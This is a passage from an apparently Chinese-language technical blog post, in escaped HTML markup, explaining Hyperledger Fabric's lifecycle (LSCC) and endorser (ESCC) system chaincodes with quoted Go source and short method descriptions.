&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;		&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;collectionsConfig&lt;/span&gt; []&lt;span style=&#34;color:#66d9ef&#34;&gt;byte&lt;/span&gt;
		&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;ac&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Capabilities&lt;/span&gt;().&lt;span style=&#34;color:#a6e22e&#34;&gt;PrivateChannelData&lt;/span&gt;() &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; len(&lt;span style=&#34;color:#a6e22e&#34;&gt;args&lt;/span&gt;) &amp;gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt; {
			&lt;span style=&#34;color:#a6e22e&#34;&gt;collectionsConfig&lt;/span&gt; = &lt;span style=&#34;color:#a6e22e&#34;&gt;args&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;]
		}

        &lt;span style=&#34;color:#75715e&#34;&gt;// 将所有的参数传入executeDeployOrUpgrade方法中执行
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;		&lt;span style=&#34;color:#a6e22e&#34;&gt;cd&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;lscc&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;executeDeployOrUpgrade&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;stub&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;channel&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;cds&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;EP&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;escc&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;vscc&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;collectionsConfig&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;function&lt;/span&gt;)
		&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;shim&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Success&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;cdbytes&lt;/span&gt;)
	&lt;span style=&#34;color:#66d9ef&#34;&gt;case&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;CCEXISTS&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;CHAINCODEEXISTS&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;GETDEPSPEC&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;GETDEPLOYMENTSPEC&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;GETCCDATA&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;GETCHAINCODEDATA&lt;/span&gt;:
		&lt;span style=&#34;color:#75715e&#34;&gt;// 变量个数必须为3
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;		&lt;span style=&#34;color:#a6e22e&#34;&gt;channel&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; string(&lt;span style=&#34;color:#a6e22e&#34;&gt;args&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;])
		&lt;span style=&#34;color:#a6e22e&#34;&gt;ccname&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; string(&lt;span style=&#34;color:#a6e22e&#34;&gt;args&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;])
		
		&lt;span style=&#34;color:#a6e22e&#34;&gt;cdbytes&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;lscc&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;getCCInstance&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;stub&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;ccname&lt;/span&gt;) &lt;span style=&#34;color:#75715e&#34;&gt;// 获取实例
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
		&lt;span style=&#34;color:#66d9ef&#34;&gt;switch&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;function&lt;/span&gt; {
		&lt;span style=&#34;color:#66d9ef&#34;&gt;case&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;CCEXISTS&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;CHAINCODEEXISTS&lt;/span&gt;:
			&lt;span style=&#34;color:#a6e22e&#34;&gt;cd&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;lscc&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;getChaincodeData&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;ccname&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;cdbytes&lt;/span&gt;) &lt;span style=&#34;color:#75715e&#34;&gt;// 获取链码数据
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;		&lt;span style=&#34;color:#66d9ef&#34;&gt;case&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;GETCCDATA&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;GETCHAINCODEDATA&lt;/span&gt;:
			&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;shim&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Success&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;cdbytes&lt;/span&gt;)
		&lt;span style=&#34;color:#66d9ef&#34;&gt;case&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;GETDEPSPEC&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;GETDEPLOYMENTSPEC&lt;/span&gt;:
			&lt;span style=&#34;color:#a6e22e&#34;&gt;_&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;depspecbytes&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;lscc&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;getCCCode&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;ccname&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;cdbytes&lt;/span&gt;)
			&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;shim&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Success&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;depspecbytes&lt;/span&gt;)
		&lt;span style=&#34;color:#66d9ef&#34;&gt;default&lt;/span&gt;:
			panic(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;unreachable&amp;#34;&lt;/span&gt;)
		}
	&lt;span style=&#34;color:#66d9ef&#34;&gt;case&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;GETCHAINCODES&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;GETCHAINCODESALIAS&lt;/span&gt;:
		&lt;span style=&#34;color:#75715e&#34;&gt;// 变量个数必须为1
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;		&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;lscc&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;getChaincodes&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;stub&lt;/span&gt;) &lt;span style=&#34;color:#75715e&#34;&gt;// 调用对应方法
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;case&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;GETINSTALLEDCHAINCODES&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;GETINSTALLEDCHAINCODESALIAS&lt;/span&gt;:
		&lt;span style=&#34;color:#75715e&#34;&gt;// 变量个数必须为1
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;		&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;lscc&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;getInstalledChaincodes&lt;/span&gt;() &lt;span style=&#34;color:#75715e&#34;&gt;// 调用对应方法
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;case&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;GETCOLLECTIONSCONFIG&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;GETCOLLECTIONSCONFIGALIAS&lt;/span&gt;:
		&lt;span style=&#34;color:#75715e&#34;&gt;// 变量个数必须为2
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;		&lt;span style=&#34;color:#a6e22e&#34;&gt;chaincodeName&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; string(&lt;span style=&#34;color:#a6e22e&#34;&gt;args&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;])
		&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;lscc&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;getChaincodeCollectionData&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;stub&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;chaincodeName&lt;/span&gt;) &lt;span style=&#34;color:#75715e&#34;&gt;// 调用对应方法
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;	}

	&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;shim&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Error&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;InvalidFunctionErr&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;function&lt;/span&gt;).&lt;span style=&#34;color:#a6e22e&#34;&gt;Error&lt;/span&gt;())
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Install方法：&lt;/p&gt;
&lt;p&gt;用于存储chaincode程序到peer的文件系统，需要一个参数，及chancode deployment spec的序列化protobuf bytes。&lt;/p&gt;
&lt;p&gt;Deploy方法：&lt;/p&gt;
&lt;p&gt;用于在给定的通道上实例化合约，可以接受五个参数，前两个参数是必须的：通道名称与chaincode deployment spec。另外三个参数为：倍数策略、背书系统合约的名字和验证系统合约的名字。&lt;/p&gt;
&lt;p&gt;Upgrade方法：&lt;/p&gt;
&lt;p&gt;用于升级合约&lt;/p&gt;
&lt;p&gt;Get方法：&lt;/p&gt;
&lt;p&gt;剩下的get方法都用于获取相应的合约数据&lt;/p&gt;
&lt;h3 id=&#34;背书系统链码-endorser-system-chaincode-escc&#34;&gt;背书系统链码 (&lt;em&gt;Endorser System Chaincode&lt;/em&gt;, ESCC)&lt;/h3&gt;
&lt;p&gt;在背书节点上运行，对交易结束进行结构转换和签名背书。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;/core/endorser/endorser.go&lt;/p&gt;
&lt;/blockquote&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-go&#34; data-lang=&#34;go&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;package&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;endorser&lt;/span&gt;

&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; (
	&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;context&amp;#34;&lt;/span&gt;
	&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;fmt&amp;#34;&lt;/span&gt;
	&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;strconv&amp;#34;&lt;/span&gt;
	&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;time&amp;#34;&lt;/span&gt;

	&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;github.com/golang/protobuf/proto&amp;#34;&lt;/span&gt;
	&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;github.com/hyperledger/fabric-chaincode-go/shim&amp;#34;&lt;/span&gt;
	&lt;span style=&#34;color:#a6e22e&#34;&gt;pb&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;github.com/hyperledger/fabric-protos-go/peer&amp;#34;&lt;/span&gt;
	&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;github.com/hyperledger/fabric-protos-go/transientstore&amp;#34;&lt;/span&gt;
	&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;github.com/hyperledger/fabric/common/flogging&amp;#34;&lt;/span&gt;
	&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;github.com/hyperledger/fabric/common/util&amp;#34;&lt;/span&gt;
	&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;github.com/hyperledger/fabric/core/chaincode/lifecycle&amp;#34;&lt;/span&gt;
	&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;github.com/hyperledger/fabric/core/common/ccprovider&amp;#34;&lt;/span&gt;
	&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;github.com/hyperledger/fabric/core/ledger&amp;#34;&lt;/span&gt;
	&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;github.com/hyperledger/fabric/internal/pkg/identity&amp;#34;&lt;/span&gt;
	&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;github.com/hyperledger/fabric/msp&amp;#34;&lt;/span&gt;
	&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;github.com/hyperledger/fabric/protoutil&amp;#34;&lt;/span&gt;
	&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;github.com/pkg/errors&amp;#34;&lt;/span&gt;
	&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;go.uber.org/zap&amp;#34;&lt;/span&gt;
)

&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;endorserLogger&lt;/span&gt; = &lt;span style=&#34;color:#a6e22e&#34;&gt;flogging&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;MustGetLogger&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;endorser&amp;#34;&lt;/span&gt;)

&lt;span style=&#34;color:#75715e&#34;&gt;// The Jira issue that documents Endorser flow along with its relationship to
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// the lifecycle chaincode - https://jira.hyperledger.org/browse/FAB-181
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;//go:generate counterfeiter -o fake/prvt_data_distributor.go --fake-name PrivateDataDistributor . PrivateDataDistributor
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;type&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;PrivateDataDistributor&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;interface&lt;/span&gt; {
	&lt;span style=&#34;color:#a6e22e&#34;&gt;DistributePrivateData&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;channel&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;string&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;txID&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;string&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;privateData&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;transientstore&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;TxPvtReadWriteSetWithConfigInfo&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;blkHt&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;uint64&lt;/span&gt;) &lt;span style=&#34;color:#66d9ef&#34;&gt;error&lt;/span&gt;
}

&lt;span style=&#34;color:#75715e&#34;&gt;// Support contains functions that the endorser requires to execute its tasks
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;type&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Support&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;interface&lt;/span&gt; {
	&lt;span style=&#34;color:#a6e22e&#34;&gt;identity&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;SignerSerializer&lt;/span&gt;
	&lt;span style=&#34;color:#75715e&#34;&gt;// GetTxSimulator returns the transaction simulator for the specified ledger
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;// a client may obtain more than one such simulator; they are made unique
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;// by way of the supplied txid
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;	&lt;span style=&#34;color:#a6e22e&#34;&gt;GetTxSimulator&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;ledgername&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;string&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;txid&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;string&lt;/span&gt;) (&lt;span style=&#34;color:#a6e22e&#34;&gt;ledger&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;TxSimulator&lt;/span&gt;, &lt;span style=&#34;color:#66d9ef&#34;&gt;error&lt;/span&gt;)

	&lt;span style=&#34;color:#75715e&#34;&gt;// GetHistoryQueryExecutor gives handle to a history query executor for the
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;// specified ledger
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;	&lt;span style=&#34;color:#a6e22e&#34;&gt;GetHistoryQueryExecutor&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;ledgername&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;string&lt;/span&gt;) (&lt;span style=&#34;color:#a6e22e&#34;&gt;ledger&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;HistoryQueryExecutor&lt;/span&gt;, &lt;span style=&#34;color:#66d9ef&#34;&gt;error&lt;/span&gt;)

	&lt;span style=&#34;color:#75715e&#34;&gt;// GetTransactionByID retrieves a transaction by id
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;	&lt;span style=&#34;color:#a6e22e&#34;&gt;GetTransactionByID&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;chid&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;txID&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;string&lt;/span&gt;) (&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;pb&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;ProcessedTransaction&lt;/span&gt;, &lt;span style=&#34;color:#66d9ef&#34;&gt;error&lt;/span&gt;)

	&lt;span style=&#34;color:#75715e&#34;&gt;// IsSysCC returns true if the name matches a system chaincode&amp;#39;s
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;// system chaincode names are system, chain wide
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;	&lt;span style=&#34;color:#a6e22e&#34;&gt;IsSysCC&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;string&lt;/span&gt;) &lt;span style=&#34;color:#66d9ef&#34;&gt;bool&lt;/span&gt;

	&lt;span style=&#34;color:#75715e&#34;&gt;// Execute - execute proposal, return original response of chaincode
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;	&lt;span style=&#34;color:#a6e22e&#34;&gt;Execute&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;txParams&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;ccprovider&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;TransactionParams&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;string&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;input&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;pb&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;ChaincodeInput&lt;/span&gt;) (&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;pb&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Response&lt;/span&gt;, &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;pb&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;ChaincodeEvent&lt;/span&gt;, &lt;span style=&#34;color:#66d9ef&#34;&gt;error&lt;/span&gt;)

	&lt;span style=&#34;color:#75715e&#34;&gt;// ExecuteLegacyInit - executes a deployment proposal, return original response of chaincode
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;	&lt;span style=&#34;color:#a6e22e&#34;&gt;ExecuteLegacyInit&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;txParams&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;ccprovider&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;TransactionParams&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;version&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;string&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;spec&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;pb&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;ChaincodeInput&lt;/span&gt;) (&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;pb&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Response&lt;/span&gt;, &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;pb&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;ChaincodeEvent&lt;/span&gt;, &lt;span style=&#34;color:#66d9ef&#34;&gt;error&lt;/span&gt;)

	&lt;span style=&#34;color:#75715e&#34;&gt;// ChaincodeEndorsementInfo returns the information from lifecycle required to endorse the chaincode.
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;	&lt;span style=&#34;color:#a6e22e&#34;&gt;ChaincodeEndorsementInfo&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;channelID&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;chaincodeID&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;string&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;txsim&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;ledger&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;QueryExecutor&lt;/span&gt;) (&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;lifecycle&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;ChaincodeEndorsementInfo&lt;/span&gt;, &lt;span style=&#34;color:#66d9ef&#34;&gt;error&lt;/span&gt;)

	&lt;span style=&#34;color:#75715e&#34;&gt;// CheckACL checks the ACL for the resource for the channel using the
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;// SignedProposal from which an id can be extracted for testing against a policy
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;	&lt;span style=&#34;color:#a6e22e&#34;&gt;CheckACL&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;channelID&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;string&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;signedProp&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;pb&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;SignedProposal&lt;/span&gt;) &lt;span style=&#34;color:#66d9ef&#34;&gt;error&lt;/span&gt;

	&lt;span style=&#34;color:#75715e&#34;&gt;// EndorseWithPlugin endorses the response with a plugin
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;	&lt;span style=&#34;color:#a6e22e&#34;&gt;EndorseWithPlugin&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;pluginName&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;channnelID&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;string&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;prpBytes&lt;/span&gt; []&lt;span style=&#34;color:#66d9ef&#34;&gt;byte&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;signedProposal&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;pb&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;SignedProposal&lt;/span&gt;) (&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;pb&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Endorsement&lt;/span&gt;, []&lt;span style=&#34;color:#66d9ef&#34;&gt;byte&lt;/span&gt;, &lt;span style=&#34;color:#66d9ef&#34;&gt;error&lt;/span&gt;)

	&lt;span style=&#34;color:#75715e&#34;&gt;// GetLedgerHeight returns ledger height for given channelID
